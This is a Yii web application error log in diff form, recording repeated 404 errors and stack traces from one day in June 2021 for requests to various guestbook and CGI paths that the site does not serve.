+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook
+2021/06/17 20:38:13 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook
+2021/06/17 20:38:13 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook
+2021/06/17 20:38:13 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook
+2021/06/17 20:38:13 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook
+2021/06/17 20:38:14 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook
+2021/06/17 20:38:14 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "aska.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('aska.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/aska.cgi
+2021/06/17 20:38:15 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "aska.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('aska.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/aska.cgi
+2021/06/17 20:38:15 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "aska.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('aska.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/aska.cgi
+2021/06/17 20:38:15 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "aska.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('aska.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/aska.cgi
+2021/06/17 20:38:16 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "aska.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('aska.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/aska.cgi
+2021/06/17 20:38:16 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "aska.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('aska.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/aska.cgi
+2021/06/17 20:38:16 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "jax_guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('jax_guestbook.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/jax_guestbook.php
+2021/06/17 20:38:16 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "jax_guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('jax_guestbook.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/jax_guestbook.php
+2021/06/17 20:38:17 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "jax_guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('jax_guestbook.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/jax_guestbook.php
+2021/06/17 20:38:17 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "jax_guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('jax_guestbook.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/jax_guestbook.php
+2021/06/17 20:38:17 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "jax_guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('jax_guestbook.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/jax_guestbook.php
+2021/06/17 20:38:17 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "jax_guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('jax_guestbook.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/jax_guestbook.php
+2021/06/17 20:38:18 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:38:18 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:38:19 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:38:19 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:38:19 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:38:19 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:38:19 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:38:20 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:38:20 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:38:20 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:38:20 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:38:21 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:38:21 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:21 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:21 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:22 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:22 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:22 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:22 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:38:22 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:38:23 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:38:23 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:38:23 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:38:23 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:38:24 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:38:24 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:38:24 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:38:24 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:38:24 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:38:25 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:38:25 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:38:25 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:38:25 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:38:25 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:38:26 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:38:26 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:38:26 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:38:26 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:38:26 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:38:27 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:38:27 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:38:27 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:38:27 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:38:27 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
